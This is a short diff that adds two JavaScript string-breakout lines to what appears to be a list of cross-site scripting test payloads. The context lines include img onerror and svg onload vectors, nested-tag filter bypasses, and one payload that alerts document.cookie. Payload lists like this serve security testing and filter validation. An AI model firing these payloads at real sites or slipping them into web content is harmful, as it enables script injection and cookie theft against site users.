@@ -11,6 +11,8 @@
 <img src="" onerror="alert(document.cookie)">
 <img src='x' onerror='alert(document.cookie)' />
 <svg/onload=alert(1)>
+';alert('1');'
+';alert('abc');'
 <sc<script>ript>alert(1)</sc</script>ript>
 <BODY ONLOAD=alert('1')>
 <marquee onstart=alert(1)></marquee>
